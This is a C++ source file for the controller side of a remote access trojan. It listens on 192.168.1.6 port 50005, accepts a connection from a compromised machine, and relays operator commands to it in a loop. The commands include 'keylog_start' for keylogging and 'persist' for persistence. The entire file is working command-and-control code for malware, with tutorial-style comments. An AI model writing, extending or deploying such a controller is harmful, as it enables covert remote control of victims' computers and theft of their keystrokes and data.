#include <iostream> 
#include <stdio.h>  // Standard input/output functions for printing and reading
#include <sys/types.h>  // Data types used in socket programming
#include <sys/socket.h>  // Provides socket functions like socket(), bind(), etc.
#include <netinet/in.h>  // Structures for storing internet addresses
#include <stdlib.h>  // Standard library functions like malloc(), free(), etc.
#include <string.h>  // String handling functions like bzero(), strtok()
#include <unistd.h>  // Provides access to the POSIX operating system API
#include <arpa/inet.h>  // Functions for working with IP addresses (e.g., inet_addr())
using namespace std;

/*Your Compiler might pe showing you some errors in the program if you are in VS code but these are
only the error about the external libraries which are not pre installed but at the compilation time
you have to mention them specificlly to compile the program successfully */

int main() {
    int sock, client_socket;  // Variables for server socket and client socket descriptors
    char buffer[1024];  // Buffer for sending commands to the client
    char response[18384];  // Buffer for storing responses from the client
    struct sockaddr_in server_address, client_address;  // Structures for server and client addresses
    int i = 0;  // General-purpose variable (unused here)
    int optval = 1;  // Option value to set socket options
    socklen_t client_length;  // Variable to store the size of the client address structure

    // Create a socket using the TCP protocol (SOCK_STREAM)
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Set socket options to allow reusing the address (prevents "address in use" error)
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error Setting TCP Socket Options!\n");
        return 1;  // Exit the program if setting options fails
    }

    // Configure the server address structure
    server_address.sin_family = AF_INET;  // Use IPv4
    server_address.sin_addr.s_addr = inet_addr("192.168.1.6");  // Set the server IP address
    server_address.sin_port = htons(50005);  // Set the server port (convert to network byte order)

    // Bind the socket to the specified IP address and port
    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));

    // Start listening for incoming connections (up to 5 in the backlog)
    listen(sock, 5);

    // Get the size of the client address structure
    client_length = sizeof(client_address);

    // Accept a connection from a client
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

    // Enter an infinite loop to handle commands from the server's shell
    while (1) {
        jump:  // Label for "goto" statements
        bzero(&buffer, sizeof(buffer));  // Clear the buffer before reuse
        bzero(&response, sizeof(response));  // Clear the response buffer
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));  // Display the client IP in the prompt
        fgets(buffer, sizeof(buffer), stdin);  // Read a command from the server's shell
        strtok(buffer, "\n");  // Remove the newline character from the input
        write(client_socket, buffer, sizeof(buffer));  // Send the command to the client

        // Check if the command is "q" (quit)
        if (strncmp("q", buffer, 1) == 0) {
            break;  // Exit the loop if "q" is entered
        }
        // Check if the command starts with "cd " (change directory)
        else if (strncmp("cd ", buffer, 3) == 0) {
            goto jump;  // Skip receiving a response and prompt for the next command
        }
        // Check if the command is "keylog_start" (start keylogging)
        else if (strncmp("keylog_start", buffer, 12) == 0) {
            goto jump;  // Skip receiving a response and prompt for the next command
        }
        // Check if the command is "persist" (persistence mechanism)
        else if (strncmp("persist", buffer, 7) == 0) {
            recv(client_socket, response, sizeof(response), 0);  // Receive the client's response
            printf("%s", response);  // Print the response
        }
        // For all other commands, receive the full response from the client
        else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);  // Wait until the entire response is received
            printf("%s", response);  // Print the response
        }
    }

    return 0;  // Exit the program
}
